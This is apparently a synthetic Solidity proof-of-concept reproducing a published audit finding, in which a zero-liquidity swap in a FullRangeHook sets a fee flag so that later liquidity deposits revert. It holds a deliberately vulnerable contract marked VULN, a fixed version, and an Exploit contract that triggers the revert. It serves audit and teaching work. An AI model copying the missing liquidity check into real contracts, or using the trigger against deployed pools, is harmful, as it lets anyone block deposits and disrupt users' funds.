// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Paladin Valkyrie FullRangeHook — a zero-liquidity swap sets hasAccruedFees
    (Cyfrin / Draiakoo, finding #61558, 12 March 2025).

    SYNTHETIC, cheatcode-free. beforeSwap does not require liquidity > 0.
    The flag is set. The next addLiquidity rebalances with a 0 delta and
    Position.update reverts CannotUpdateEmptyPosition, so N = 1000 LP stays
    with the depositor. The fixed beforeSwap rejects the zero-liquidity swap
    and the same deposit then succeeds. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error CannotUpdateEmptyPosition();

contract FullRangeHook {
    Token public token;
    uint256 public liquidity;
    bool public hasAccruedFees;

    constructor(Token token_) {
        token = token_;
    }

    function beforeSwap() external {
        // @> VULN: liquidity is not checked, so a zero-liquidity swap still sets the flag
        if (!hasAccruedFees) hasAccruedFees = true;
    }

    function addLiquidity(uint256 amount) external {
        if (hasAccruedFees) {
            hasAccruedFees = false;
            _rebalance();
        }
        token.transferFrom(msg.sender, address(this), amount);
        liquidity += amount;
    }

    function _rebalance() internal {
        int256 liquidityDelta = -int256(liquidity);
        _updatePosition(liquidityDelta);
    }

    function _updatePosition(int256 liquidityDelta) internal view {
        if (liquidityDelta == 0) {
            if (liquidity == 0) revert CannotUpdateEmptyPosition();
        }
    }
}

contract FullRangeHookFixed {
    Token public token;
    uint256 public liquidity;
    bool public hasAccruedFees;

    constructor(Token token_) {
        token = token_;
    }

    function beforeSwap() external {
        require(liquidity > 0, "zero liquidity");
        if (!hasAccruedFees) hasAccruedFees = true;
    }

    function addLiquidity(uint256 amount) external {
        if (hasAccruedFees) {
            hasAccruedFees = false;
            _rebalance();
        }
        token.transferFrom(msg.sender, address(this), amount);
        liquidity += amount;
    }

    function _rebalance() internal {
        int256 liquidityDelta = -int256(liquidity);
        _updatePosition(liquidityDelta);
    }

    function _updatePosition(int256 liquidityDelta) internal view {
        if (liquidityDelta == 0) {
            if (liquidity == 0) revert CannotUpdateEmptyPosition();
        }
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Token public token;
    FullRangeHook public hook;

    constructor() {
        token = new Token("Liquidity", "LP", 18);
        hook = new FullRangeHook(token);
    }

    function run() external {
        token.mint(address(this), N);
        token.approve(address(hook), N);
        hook.beforeSwap();
        require(hook.liquidity() == 0, "liquidity was not zero");
        require(hook.hasAccruedFees(), "flag was not set");
        (bool ok,) = address(hook).call(abi.encodeWithSignature("addLiquidity(uint256)", N));
        require(!ok, "add should revert");
        require(token.balanceOf(address(this)) == N, "N did not stay with the LP");
        require(token.balanceOf(address(hook)) == 0, "hook took N");
        require(hook.liquidity() == 0, "liquidity changed");
    }
}
